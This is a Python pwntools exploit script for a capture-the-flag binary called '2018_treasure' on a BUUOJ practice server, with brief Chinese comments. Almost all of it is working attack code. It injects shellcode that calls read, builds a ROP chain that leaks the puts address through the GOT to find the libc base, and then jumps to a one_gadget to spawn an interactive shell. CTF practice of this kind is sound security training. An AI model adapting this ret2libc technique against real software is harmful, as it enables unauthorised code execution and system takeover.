# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './2018_treasure'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26422'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

one_gad = one_gadget(libc.path)

treasure_addr = elf.sym["treasure"]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
pop_rdi_ret = 0x0000000000400b83
ret = 0x00000000004006a9

# 其本质是可以让你任意执行一段想要执行的代码
# 下面标准 syscall_read 调用

code = '''
push rsp;
pop rsi;
mov rdx,r12;
syscall;
ret
'''
# 执行到 shellcode 时经观察 rax 不刚好就是0吗 syscall 可以调用read

sla(":","y")
sla("start!!!!",asm(code))

payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(treasure_addr)
se(payload)
puts_addr = l64()
lg("puts_addr",puts_addr)
libc.address = puts_addr - libc.sym["puts"]
ogg = one_gad[1] + libc.address

# 第一个ogg用不了

sla(":","y")
sla("start!!!!",asm(code))
payload = p64(ret) + p64(ogg)

se(payload)

p.interactive()

'''
@File    :   2018_treasure.py
@Time    :   2021/08/18 00:19:34
@Author  :   Niyah 
'''